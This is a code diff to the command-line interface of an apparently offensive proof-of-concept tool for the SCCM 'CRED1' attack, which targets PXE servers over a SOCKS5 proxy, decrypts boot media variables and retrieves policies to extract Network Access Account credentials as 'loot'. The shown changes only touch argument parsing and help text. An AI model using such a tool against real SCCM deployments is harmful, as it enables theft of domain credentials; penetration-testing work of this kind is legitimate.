@@ -6,9 +6,9 @@ import xml.etree.ElementTree as ET
 
 # Parse arguments
 parser = argparse.ArgumentParser(description="SCCM CRED1 SOCKS5 POC")
-subparsers = parser.add_subparsers(dest="mode")
+subparsers = parser.add_subparsers(dest="mode", required=True)
 
-# Main attack mode (default when no subcommand)
+# Attack mode
 attack_parser = subparsers.add_parser("attack", help="Run the CRED1 attack against a PXE server")
 attack_parser.add_argument("target", help="SCCM PXE IP")
 attack_parser.add_argument("src_ip", help="Source IP")
@@ -30,7 +30,7 @@ loot_parser.add_argument("-o", "--output", help="Output directory for loot files
 
 # Policies mode — retrieve and decrypt policies from MP using PFX cert
 policies_parser = subparsers.add_parser("policies", help="Retrieve policies from MP using PFX cert (extracts NAA creds)")
-policies_parser.add_argument("xml_file", help="Path to decrypted media variables XML or loot_summary.txt")
+policies_parser.add_argument("xml_file", help="Path to variables.xml (decrypted media variables XML)")
 policies_parser.add_argument("-o", "--output", help="Output directory for policy files", type=str, default="./loot")
 policies_parser.add_argument("--mp", help="Override management point URL", type=str, default=None)
 policies_parser.add_argument(
@@ -50,25 +50,13 @@ policies_local_parser = subparsers.add_parser(
     "policies-local",
     help="Decrypt local policy .raw blobs using PFX from media XML",
 )
-policies_local_parser.add_argument("xml_file", help="Path to decrypted media variables XML or loot_summary.txt")
+policies_local_parser.add_argument("xml_file", help="Path to variables.xml (decrypted media variables XML)")
 policies_local_parser.add_argument(
     "-i", "--input", help="Directory containing NAAConfig.raw/TaskSequence_*.raw", type=str, default="./loot"
 )
 policies_local_parser.add_argument("-o", "--output", help="Output directory for decrypted policy files", type=str, default="./loot")
 
 args = parser.parse_args()
-
-# For backwards compatibility: if no subcommand, treat positional args as attack mode
-if args.mode is None:
-    attack_parser = argparse.ArgumentParser(description="SCCM CRED1 SOCKS5 POC")
-    attack_parser.add_argument("target", help="SCCM PXE IP")
-    attack_parser.add_argument("src_ip", help="Source IP")
-    attack_parser.add_argument("socks_host", help="SOCKS5 proxy host")
-    attack_parser.add_argument("socks_port", help="SOCKS5 proxy port", type=int)
-    attack_parser.add_argument("-p", "--password", help="Cracked password (hex) for password-protected media file", type=str, default=None)
-    attack_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")
-    args = attack_parser.parse_args()
-    args.mode = "attack"
 
 def handle_decrypted_xml(sccm_client, decrypted_xml, output_dir):
     """Extract PFX cert and key info from decrypted media variables."""
